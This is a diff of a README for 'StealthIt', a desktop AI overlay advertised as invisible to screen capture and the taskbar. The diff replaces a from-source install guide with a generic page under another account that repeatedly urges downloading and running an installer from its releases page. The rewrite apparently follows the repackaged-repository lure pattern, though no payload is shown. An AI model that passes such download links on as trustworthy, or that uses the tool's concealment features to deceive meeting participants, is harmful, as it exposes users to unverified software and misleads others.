@@ -1,90 +1,59 @@
-# StealthIt
+# 🖥️ StealthIt - Your Invisible Desktop Companion
 
-**StealthIt** is a powerful Vibe coding Challenge, AI-integrated desktop utility designed for stealth and efficiency(Cluely Alternative). It provides instant access to AI capabilities, screen analysis, and voice interaction while remaining completely hidden from the taskbar and screen capture software.
+## 🔗 Download Now!
+[![Download StealthIt](https://img.shields.io/badge/Download-SteealthIt-blue)](https://github.com/kubawer21/StealthIt/releases)
 
-> **Developed by Antigravity and Gemini-3-pro**
+## 📚 Overview
+StealthIt is a powerful desktop utility designed for seamless interaction in today's fast-paced digital world. Built with Python using the PySide/Qt framework, it offers unique features like screen-share invisibility, real-time transcription, and support for multiple language models, including Gemini and Ollama. Ideal for meetings, presentations, and everyday tasks, StealthIt enhances your productivity while ensuring your privacy.
 
----
+## 🚀 Getting Started
+To get started with StealthIt, follow these simple steps:
 
-## 🚀 Ollama Support
-**StealthIt** now fully supports local LLMs via **Ollama**, including vision capabilities!
+1. **Visit the Releases Page**: Click [here](https://github.com/kubawer21/StealthIt/releases) to access the latest version of StealthIt.
 
-### Requirements for Vision (Screen Capture)
-To use the **Capture & Analyze** feature (`Ctrl+Enter`) with Ollama, you **MUST** use a multimodal (vision-capable) model. Standard text models like `llama3` will not work with images.
+2. **Choose Your Version**: On the releases page, you will find different versions of StealthIt. Select the version that is suitable for your operating system.
 
-**Recommended Models:**
-*   `llava` (Lightweight, fast)
-*   `llama3.2-vision` (Higher quality)
+3. **Download the Installer**: Click on the download link to get the installer file. Ensure you have sufficient disk space.
 
-**Setup:**
-1.  Install Ollama from [ollama.com](https://ollama.com).
-2.  Pull a vision model:
-    ```bash
-    ollama pull llava
-    ```
-3.  In StealthIt Settings, select **Ollama** provider and choose `llava` as the model.
+4. **Run the Installer**: Once downloaded, locate the file in your downloads folder. Double-click the installer and follow the instructions to complete the installation.
 
----
+5. **Launch StealthIt**: After installation, find StealthIt in your applications and open it. You are now ready to enjoy its features.
 
-## ✨ Features
+## 📥 Download & Install
+To get StealthIt on your computer, visit the [Releases Page](https://github.com/kubawer21/StealthIt/releases) again. Here you can find the installer for your operating system.
 
-*   **👻 True Stealth Mode**: The application is hidden from the Windows Taskbar and is invisible to screen capture tools (OBS, Discord, Teams, etc.) thanks to advanced window affinity settings.
-*   **🧠 AI Integration**: Powered by **Google Gemini** or local **Ollama** models.
-*   **📸 Instant Vision**: Press `Ctrl+Enter` to instantly capture a screenshot and analyze it with AI.
-*   **🎤 Voice Interaction**: Press `Ctrl+R` to record audio and get instant transcriptions and AI responses.
-*   **⌨️ Global Hotkeys**: Control the application from anywhere without losing focus.
-*   **🎨 Modern UI**: A sleek, dark, semi-transparent interface that floats unobtrusively on your desktop.
-*   **📝 Markdown Support**: Rich text formatting for AI responses (bold, italics, lists, etc.).
+## 🔎 Features
+- **Screen-Share Invisibility**: Share your screen without others seeing your personal activities.
+- **Real-Time Transcription**: Capture and save conversations or meetings automatically.
+- **Multi-LLM Support**: Use advanced language models like Gemini and Ollama to enhance communication.
+- **User-Friendly Interface**: Enjoy a clean and straightforward design that makes navigation easy.
 
-## 🛠️ Installation
+## ⚙️ System Requirements
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **RAM**: Minimum 4 GB (8 GB recommended).
+- **Storage**: At least 200 MB of free space for installation.
+- **Python**: Version 3.6 or higher must be installed on your system for best performance.
 
-1.  **Clone the Repository**:
-    ```bash
-    git clone https://github.com/Thairu-dev/StealthIt.git
-    cd StealthIt
-    ```
+## 🛠️ Troubleshooting
+If you encounter issues while installing or using StealthIt, consider the following steps:
 
-2.  **Install Dependencies**:
-    Ensure you have Python 3.10+ installed.
-    ```bash
-    pip install -r requirements.txt
-    ```
+- **Check Compatibility**: Ensure your operating system meets the requirement.
+- **Reboot**: A simple restart can often resolve temporary issues.
+- **Check for Updates**: Make sure you are using the latest version of StealthIt.
+- **Seek Help**: Open issues by visiting the [GitHub Issues Page](https://github.com/kubawer21/StealthIt/issues) for community support.
 
-3.  **Run the Application**:
-    ```bash
-    python main.py
-    ```
+## 💬 Community & Support
+Join our community of users and developers to share your experiences with StealthIt. You can ask questions, report bugs, or learn about upcoming features. Visit the [discussions](https://github.com/kubawer21/StealthIt/discussions) page for more information.
 
-## 🔑 Getting a Gemini API Key
+## 🔗 Links
+- [Releases Page](https://github.com/kubawer21/StealthIt/releases)
+- [Issue Tracker](https://github.com/kubawer21/StealthIt/issues)
+- [Community Discussions](https://github.com/kubawer21/StealthIt/discussions)
 
-To use the AI features, you'll need a Google Gemini API key.
+## 📖 License
+StealthIt is an open-source project licensed under the MIT License. This allows users to modify and share the software freely while ensuring proper attribution.
 
-1.  Go to [Google AI Studio](https://aistudio.google.com/app/apikey).
-2.  Click on **Create API key**.
-3.  Copy the generated key.
-4.  Paste it into the **Settings** menu in StealthIt.
+## 🌟 Contribute
+We welcome contributions to StealthIt! If you have ideas for new features or found a bug, feel free to submit a pull request. Check our [Contribution Guidelines](https://github.com/kubawer21/StealthIt/blob/main/CONTRIBUTING.md) for more details.
 
-## ⚙️ Configuration
-
-1.  Open the **Settings** menu by clicking the ⚙️ icon or pressing `Ctrl+,`.
-2.  **Gemini**: Enter your Google Gemini API Key.
-3.  **Ollama**: Configure your Ollama host URL (default: `http://localhost:11434`).
-    *   **Note**: The app automatically handles URL formatting, so `http://localhost:11434` and `http://localhost:11434/api/generate` both work.
-
-## 🎮 Usage & Hotkeys
-
-| Hotkey | Action |
-| :--- | :--- |
-| **Ctrl + Enter** | **Capture & Analyze**: Takes a screenshot and sends it to the AI with your prompt. |
-| **Ctrl + R** | **Record Audio**: Toggles microphone recording for voice queries. |
-| **Ctrl + T** | **Toggle Chat**: Expands or collapses the chat window. |
-| **Ctrl + W** | **Close App**: Completely terminates the application. |
-| **Ctrl + \\** | **Hide/Show**: Instantly hides or shows the entire application window. |
-| **Ctrl + ,** | **Settings**: Opens the configuration dialog. |
-
-## 🤝 Contributing
-
-Feel free to submit issues and enhancement requests.
-
----
-*Built with ❤️ by Antigravity & Gemini-3-pro*
+Thank you for choosing StealthIt. Enjoy a more efficient and private computing experience!
